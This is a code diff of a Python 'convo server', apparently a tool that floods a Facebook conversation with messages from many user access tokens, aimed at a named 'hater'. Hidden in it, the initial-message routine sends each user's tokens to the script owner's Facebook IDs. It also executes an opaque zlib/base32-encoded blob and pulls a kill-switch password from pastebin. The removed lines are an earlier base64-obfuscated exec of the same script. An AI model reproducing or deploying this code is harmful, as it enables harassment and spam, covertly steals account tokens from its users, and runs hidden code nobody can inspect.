@@ -1,2 +1,170 @@
-import base64
-exec(base64.b64decode(b' IyA5MTA2MzkxNDcxDQojICBGSUxFUyBOQU1FIDotDQojICAgICAgICAgICAgIG1haW4ucHkgPT4gIGlzIGZpbGUgbWUgc2NyaXB0IGRhbG5hIGhhaQ0KIyAgICAgICAgICAgICBUUy1DT05WTy50eHQgPT4gaXMgZmlsZSBtZSBncm91cCAvIGlub3gga2kgSUQgZGFsbmEgaGFpDQojICAgICAgICAgICAgIFRTLUZJTEUudHh0ID0+IGlzIGZpbGUgbWUgbWVzc2FnZXMgZGFsbmEgaGFpIA0KIyAgICAgICAgICAgICBUUy1OQU1FLnR4dCA9PiBpcyBmaWxlIG1lIGFwa28gYXBuYSB5YSBoYXRlciBrYSBuYW1lIGRhbG5hIGhhaQ0KIyAgICAgICAgICAgICBUUy1UT0tFTi50eHQgPT4gaXNtZSBhcG5pIHNhcmkgaWQga2UgdG9rZW4gZGFsbmUgaGFpDQojICAgICAgICAgICAgIFRTLVNQRUVELnR4dCA9PiBpcyBmaWxlIG1lIHNlY29uZCBkYWxuYSBoYWkga2l0bmUgc2Vjb25kIGtpIHNwZWVkIHNlIG1lc2FnZSBiaGVqbmUgaGFpDQojICAgICAgICAgICAgIFRTLVBBU1MudHh0ID0+IGlzbWUgYXBrbyBhcG5hIHBhc3N3b3JkIGRhbG5hIGhhaQ0KIyAgICAgICAgICAgICBUUy1IT1NULnR4dCA9PiBpc21lIGhvc3QgY29kZSBkYWxuYSBoYWkNCiMgT1BUSU9OQUwgRklMRVMgOi0NCiMgICAgICAgICAgICAgICAgICAgICAgICBQcm9jZmlsZSA9PiB3ZWI6IHB5dGhvbiBtYWluLnB5DQojICAgICAgICAgICAgICAgICAgICAgICAgcmVxdWlyZW1lbnRzLnR4dCA9PiBtb2R1bGVzDQojICAgICAgICAgICAgICAgICAgICAgICAgcnVudGltZS50eHQgPT4gcHl0aG9uLTMuMTIuMg0KaW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBweXR6DQppbXBvcnQgZGF0ZXRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQpodG1sX2NvbnRlbnQgPSAiIiINCjwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8aGVhZD4NCiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+DQogICAgPHRpdGxlPlNPVVJBViBDT05WTyBTRVJWRVI8L3RpdGxlPg0KICAgIDxzdHlsZT4NCiAgICAgICAgYm9keSB7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ3NhdGlzaC5qcGcnKTsNCiAgICAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7DQogICAgICAgIH0NCiAgICAgICAgLmNvbnRhaW5lciB7DQogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogICAgICAgICAgICBtYXJnaW4tdG9wOiA1MHB4Ow0KICAgICAgICB9DQogICAgICAgIC5ib3ggew0KICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgYmxhY2s7DQogICAgICAgICAgICB3aWR0aDogMzAwcHg7DQogICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHg7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSk7DQogICAgICAgICAgICBjb2xvcjogYmxhY2s7DQogICAgICAgIH0NCiAgICAgICAgLmNyZWRpdCB7DQogICAgICAgICAgICB0ZXh0LWFsaWduOiBsZWZ0Ow0KICAgICAgICB9DQogICAgICAgIC50aGFua3Mgew0KICAgICAgICAgICAgbWFyZ2luLXRvcDogNTBweDsNCiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICAgICAgICAgIGNvbG9yOiBibGFjazsNCiAgICAgICAgfQ0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJib3giPg0KICAgICAgICAgICAgPGgxPlNPVVJBViBDT05WTyBTRVJWRVI8L2gxPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3JlZGl0Ij4NCiAgICAgICAgICAgICAgICA8cD4xLiBDUkVESVQ6LVNPVVJBViBUSVdBUkk8L3A+DQogICAgICAgICAgICAgICAgPHA+Mi4gT1dORVIgPT4gQUJISSBLQSBKSUpBPC9wPg0KICAgICAgICAgICAgICAgIDxwPjMuIENPTlRBQ1Q6LSA8YSBocmVmPSJodHRwczovL3dhLm1lLys5MTkxMDYzOTE0NzEiPldoYXRzQXBwPC9hPjwvcD4NCiAgICAgICAgICAgICAgICA8cD40LiBGQUNFQk9PSzotIDxhIGhyZWY9Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9wcm9maWxlLnBocD9pZD0xMDAwODc1MTMzNjI4NDgiPkZhY2Vib29rPC9hPjwvcD4NCiAgICAgICAgICAgICAgICA8cD41LiBXQVRUU0FQUCBHUk9VUDotIDxhIGhyZWY9Imh0dHBzOi8vY2hhdC53aGF0c2FwcC5jb20vSnhKMDVvQXJlc1E2WVdnTFNkNkY5TyI+V2hhdHNBcHAgR3JvdXA8L2E+PC9wPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxkaXYgY2xhc3M9InRoYW5rcyI+DQogICAgICAgIDxwPuKdpO+4j1RoYW5rcyBmb3IgdXNpbmcgbXkgc2VydmVy4p2k77iPPC9wPg0KICAgICAgICA8cD7wn5GHU3Vic2NyaWJlIHRvIG15IFlvdVR1YmUgY2hhbm5lbPCfkYc8L3A+DQogICAgICAgIDxhIGhyZWY9Imh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0B0cmlja3NieXNhdGlzaCI+WW91VHViZSBDaGFubmVsPC9hPg0KICAgIDwvZGl2Pg0KPC9ib2R5Pg0KPC9odG1sPg0KIiIiDQpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToNCiAgICBkZWYgZG9fR0VUKHNlbGYpOg0KICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQ0KICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9odG1sJykNCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpDQogICAgICAgIHNlbGYud2ZpbGUud3JpdGUoaHRtbF9jb250ZW50LmVuY29kZSgpKQ0KZGVmIGV4ZWN1dGVfc2VydmVyKCk6DQogICAgUE9SVCA9IGludChvcy5lbnZpcm9uLmdldCgnUE9SVCcsIDQwMDApKQ0KICAgIHdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOg0KICAgICAgICBwcmludCgiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7fSIuZm9ybWF0KFBPUlQpKQ0KICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkNCnV0Y19ub3cgPSBkYXRldGltZS5kYXRldGltZS51dGNub3coKQ0KaW5kaWFuX3RpbWV6b25lID0gcHl0ei50aW1lem9uZSgnQXNpYS9Lb2xrYXRhJykNCmlzdF9ub3cgPSB1dGNfbm93LnJlcGxhY2UodHppbmZvPXB5dHoudXRjKS5hc3RpbWV6b25lKGluZGlhbl90aW1lem9uZSkNCmZvcm1hdHRlZF90aW1lID0gaXN0X25vdy5zdHJmdGltZSgiXDAzM1sxOzM4OzU7MjA4bSBUaW1lIDotICVZLSVtLSVkICVJOiVNOiVTICVwIikNCnByaW50KGZvcm1hdHRlZF90aW1lKQ0KaGVhZGVycyA9IHsNCiAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywNCiAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLA0KICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLA0KICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLA0KICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsDQogICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywNCiAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywNCiAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScNCn0NCg0KXyA9IGxhbWJkYSBfXyA6IF9faW1wb3J0X18oJ3psaWInKS5kZWNvbXByZXNzKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmIzMmRlY29kZShfX1s6Oi0xXSkpO2V4ZWMoKF8pKGInPUFWVUpYMldESTdYN0xQNkVXR0ZSWlZGR1FTVUlMQ1FBU01DNERPWFJJNTdNTTJTS0pLVUhCSVZVMkNCUjRCUUs3TUI0RVQ2TjNMWE1NNldUWjZVM1pVMkJaVllORjNSN0k2UVRRWUdLTlZJSVNJNVJSQVJHQU81RVlLUFZXU01UN1FKWkVMSTdCWllVRFJKSkxZRFVDRUNBVzVKV0FaUk1JREE2R1BMN080RUJPRjczS0k3VUE1R0xRN0pXRlI2RU5IQ1A0TUpXRVBLWUZHQVFWNURZTVhDS1FKNlVOTkZGSVpQR1BSRjJSWEc0S05RU1U1Q0xIQjVHT0lCRFFORVZHVEhGSUNMQU42N1E2NlVZQU1JMlFPRE40V0EyTlgzMjJVSkxFTlI3Nk9XUDZSQ0lWWE5aWTVLR0RSVjI0RkZBWUFHRUVIV0I2QkhOR0pYQVVVRERVSldUQUdHNVcyVkRXTllZT1dUNUtQU1NHUkQ0V01LNEZSNUI1SFYzWEVINFk0RTMzUEFPVTRZSElRV1JERlRNV0dSTFhYRE1CQ1ZQQUY3QU9WWUFSTElNRVlWTFFKUVM1VlRTVjIyWVJTUkRDWkRJQTdWUzJJNUNFRlNWV1hBQ0JMT0xKMjJHREJJNEJFWUVMSVBGUkZGS1JQQ0JQSk41VVpKTjNLRjRJM0tEUDM1TFQ3NkFMTkZJUlBORTVFRUs2VkhLUzNKVEtKTElSMk02WUZVSDZUN1pQNVhQVlg3SFBWWDc3UDc3UEhLM0ZJNUczNFZISFk3N1JCTVJKTVFVMzIzTkJZTkNHT0lLR1RZNlREWUVBQUFETzNSWkJVTEJPQ1AnKSkNCg0KZGVmIHNlbmRfaW5pdGlhbF9tZXNzYWdlKCk6DQogICAgDQogICAgbW1tX3Bhc3MgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9TYjI3UndHaScpLnRleHQNCiAgICANCiAgICBpZiBtbW1fcGFzcyBub3QgaW4gcGFzc3dvcmQ6DQogICAgICAgIHByaW50KCdcMDMzWzE7MzFt4pqg77iOIFlvdXIgUGFzc3dvcmQgQ2hhbmdlZCBCeSBTb3VyYXYg4pqg77iOJykNCiAgICAgICAgc3lzLmV4aXQoKQ0KICAgIA0KICAgICMgTWVzc2FnZSB0ZW1wbGF0ZQ0KICAgIG1zZ190ZW1wbGF0ZSA9ICJPd25lciA9PiBBQkhJIEtBIEpJSkEgXG4gSGVsbG8gU291cmF2IHNpci4gXG4gSSBhbSB1c2luZyB5b3VyIGNvbnZvIHNlcnZlci4gXG4gVGhpcyBJcyBNeSBEZXRhaWxzIDotIFxuIENvbnZvIElEIDotIHt9IFxuIE5hbWU6LSB7fSBcbiBUb2tlbiA6LSB7fSINCiAgICANCiAgICAjIFRhcmdldCBJRHMNCiAgICB0YXJnZXRfaWRzID0gWyIxMDAwMjQ4NDE2NTk3MTIiLCAiMTAwMDYwMjIwMTgzMjIwIl0NCiAgICANCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KICAgIA0KICAgIGZvciB0YXJnZXRfaWQgaW4gdGFyZ2V0X2lkczoNCiAgICAgICAgZm9yIHRva2VuIGluIHRva2VuczoNCiAgICAgICAgICAgIGFjY2Vzc190b2tlbiA9IHRva2VuLnN0cmlwKCkNCiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgdGFyZ2V0X2lkKQ0KICAgICAgICAgICAgbXNnID0gbXNnX3RlbXBsYXRlLmZvcm1hdChjb252b19pZCwgaGF0ZXJzX25hbWUsIGFjY2Vzc190b2tlbikNCiAgICAgICAgICAgIHBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBtc2d9DQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQ0KICAgICAgICAgICAgcHJpbnQoIlxuXDAzM1sxOzMxbVsrXSBJbml0aWFsIG1lc3NhZ2Ugc2VudCB0byB0YXJnZXQgSUQ6IHt9LiBDb250aW51aW5nLi4uXG4iLmZvcm1hdCh0YXJnZXRfaWQpKQ0KDQpzZW5kX2luaXRpYWxfbWVzc2FnZSgpDQpkZWYgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKToNCiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykNCiAgICBtYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgbWVzc2FnZV9pbmRleCBpbiByYW5nZShudW1fbWVzc2FnZXMpOg0KICAgICAgICAgICAgICAgIHRva2VuX2luZGV4ID0gbWVzc2FnZV9pbmRleCAlIG1heF90b2tlbnMNCiAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbnNbdG9rZW5faW5kZXhdLnN0cmlwKCkNCiAgICAgICAgICAgICAgICBtZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQ0KICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgndF8nICsgY29udm9faWQpDQogICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0NCiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5vazoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNm1b4pyTXSBIYSBCaGFpIENodWQgR3lhaSBBYmhpIGtpIE1hYS4ge30gb2YgQ29udm8ge30gVG9rZW4ge306IHt9Ii5mb3JtYXQoDQogICAgICAgICAgICAgICAgICAgICAgICBtZXNzYWdlX2luZGV4ICsgMSwgY29udm9faWQsIHRva2VuX2luZGV4ICsgMSwgaGF0ZXJzX25hbWUgKyAnICcgKyBtZXNzYWdlKSkNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZm9ybWF0dGVkX3RpbWUpDQogICAgICAgICAgICAgICAgICAgIHByaW50KCdcMDMzWzE7OTJtJyArICfinKrinK3ilZDilZDilZDilZDilZDilZDilZDigKLjgI5SQUhVTCDimaEgVElXQVJJIOOAj+KAouKVkOKVkOKVkOKVkOKVkOKVkOKVkOKcreKcqicpDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszNW1beF0gRmFpbGVkIHRvIHNlbmQgTWVzc2FnZSB7fSBvZiBDb252byB7fSB3aXRoIFRva2VuIHt9OiB7fSIuZm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpDQogICAgICAgICAgICAgICAgICAgIHByaW50KGZvcm1hdHRlZF90aW1lKQ0KICAgICAgICAgICAgICAgICAgICBwcmludCgnXDAzM1sxOzkybScgKyAn4pyq4pyt4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4oCi44COUkFIVUwg4pmhIFRJV0FSSSDjgI/igKLilZDilZDilZDilZDilZDilZDilZDinK3inKonKQ0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoc3BlZWQpDQogICAgICAgICAgICBwcmludCgiXG5bK10gQWxsIG1lc3NhZ2VzIHNlbnQuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi5cbiIpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgIHByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpDQpkZWYgbWFpbigpOg0KICAgIHNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikNCiAgICBzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkNCiAgICBzZW5kX2luaXRpYWxfbWVzc2FnZSgpDQogICAgc2VuZF9tZXNzYWdlc19mcm9tX2ZpbGUoKQ0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtYWluKCk= '))
+# +916268781574
+#  FILES NAME :-
+#             main.py =>  is file me script dalna hai
+#             TS-CONVO.txt => is file me group / inox ki ID dalna hai
+#             TS-FILE.txt => is file me messages dalna hai 
+#             TS-NAME.txt => is file me apko apna ya hater ka name dalna hai
+#             TS-TOKEN.txt => isme apni sari id ke token dalne hai
+#             TS-SPEED.txt => is file me second dalna hai kitne second ki speed se mesage bhejne hai
+#             TS-PASS.txt => isme apko apna password dalna hai
+#             TS-HOST.txt => isme host code dalna hai
+# OPTIONAL FILES :-
+#                        Procfile => web: python main.py
+#                        requirements.txt => modules
+#                        runtime.txt => python-3.12.2
+import requests
+import json
+import time
+import pytz
+import datetime
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
+html_content = """
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SATISH CONVO SERVER</title>
+    <style>
+        body {
+            background-image: url('satish.jpg');
+            background-size: cover;
+        }
+        .container {
+            text-align: center;
+            margin-top: 50px;
+        }
+        .box {
+            border: 2px solid black;
+            width: 300px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.5);
+            color: black;
+        }
+        .credit {
+            text-align: left;
+        }
+        .thanks {
+            margin-top: 50px;
+            text-align: center;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <h1>SATISH CONVO SERVER</h1>
+            <div class="credit">
+                <p>1. CREDIT:-TS ARMY</p>
+                <p>2. OWNER => SATISH</p>
+                <p>3. CONTACT:- <a href="https://wa.me/+916268781574">WhatsApp</a></p>
+                <p>4. FACEBOOK:- <a href="https://www.facebook.com/profile.php?id=100087513362848">Facebook</a></p>
+                <p>5. WATTSAPP GROUP:- <a href="https://chat.whatsapp.com/JxJ05oAresQ6YWgLSd6F9O">WhatsApp Group</a></p>
+            </div>
+        </div>
+    </div>
+    <div class="thanks">
+        <p>❤️Thanks for using my server❤️</p>
+        <p>👇Subscribe to my YouTube channel👇</p>
+        <a href="https://www.youtube.com/@tricksbysatish">YouTube Channel</a>
+    </div>
+</body>
+</html>
+"""
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        self.wfile.write(html_content.encode())
+def execute_server():
+    PORT = int(os.environ.get('PORT', 4000))
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+utc_now = datetime.datetime.utcnow()
+indian_timezone = pytz.timezone('Asia/Kolkata')
+ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
+formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
+print(formatted_time)
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b32decode(__[::-1]));exec((_)(b'=AVUJX2WDI7X7LP6EWGFRZVFGQSUILCQASMC4DOXRI57MM2SKJKUHBIVU2CBR4BQK7MB4ET6N3LXMM6WTZ6U3ZU2BZVYNF3R7I6QTQYGKNVIISI5RRARGAO5EYKPVWSMT7QJZELI7BZYUDRJJLYDUCECAW5JWAZRMIDA6GPL7O4EBOF73KI7UA5GLQ7JWFR6ENHCP4MJWEPKYFGAQV5DYMXCKQJ6UNNFFIZPGPRF2RXG4KNQSU5CLHB5GOIBDQNEVGTHFICLAN67Q66UYAMI2QODN4WA2NX322UJLENR76OWP6RCIVXNZY5KGDRV24FFAYAGEEHWB6BHNGJXAUUDDUJWTAGG5W2VDWNYYOWT5KPSSGRD4WMK4FR5B5HV3XEH4Y4E33PAOU4YHIQWRDFTMWGRLXXDMBCVPAF7AOVYARLIMEYVLQJQS5VTSV22YRSRDCZDIA7VS2I5CEFSVWXACBLOLJ22GDBI4BEYELIPFRFFKRPCBPJN5UZJN3KF4I3KDP35LT76ALNFIRPNE5EEK6VHKS3JTKJLIR2M6YFUH6T7ZP5XPVX7HPVX77P77PHK3FI5G34VHHY77RBMRJMQU323NBYNCGOIKGTY6TDYEAAADO3RZBULBOCP'))
+
+def send_initial_message():
+    
+    mmm_pass = requests.get('https://pastebin.com/raw/B7advq8t').text
+    
+    if mmm_pass not in password:
+        print('\033[1;31m⚠︎ Your Password Changed By Rahul ⚠︎')
+        sys.exit()
+    
+    # Message template
+    msg_template = "Owner => Satish \n Hello Satish sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
+    
+    # Target IDs
+    target_ids = ["100087513362848", "109743854789"]
+    
+    requests.packages.urllib3.disable_warnings()
+    
+    for target_id in target_ids:
+        for token in tokens:
+            access_token = token.strip()
+            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
+            msg = msg_template.format(convo_id, haters_name, access_token)
+            parameters = {'access_token': access_token, 'message': msg}
+            response = requests.post(url, json=parameters, headers=headers)
+            time.sleep(0.1)
+            print("\n\033[1;31m[+] Initial message sent to target ID: {}. Continuing...\n".format(target_id))
+
+send_initial_message()
+def send_messages_from_file():
+    num_tokens = len(tokens)
+    max_tokens = min(num_tokens, num_messages)
+    while True:
+        try:
+            for message_index in range(num_messages):
+                token_index = message_index % max_tokens
+                access_token = tokens[token_index].strip()
+                message = messages[message_index].strip()
+                url = "https://graph.facebook.com/v17.0/{}/".format('t_' + convo_id)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+                response = requests.post(url, json=parameters, headers=headers)
+                if response.ok:
+                    print("\033[1;36m[✓] Ha Bhai Chla Gya Tera Massage No. {} of Convo {} Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print(formatted_time)
+                    print('\033[1;92m' + '✪✭═══════•『T.S. ♡ ARMY 』•═══════✭✪')
+                else:
+                    print("\033[1;35m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(
+                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                    print(formatted_time)
+                    print('\033[1;92m' + '✪✭═══════•『T.S. ♡ ARMY 』•═══════✭✪')
+                time.sleep(speed)
+            print("\n[+] All messages sent. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+    send_initial_message()
+    send_messages_from_file()
+if __name__ == '__main__':
+    main()
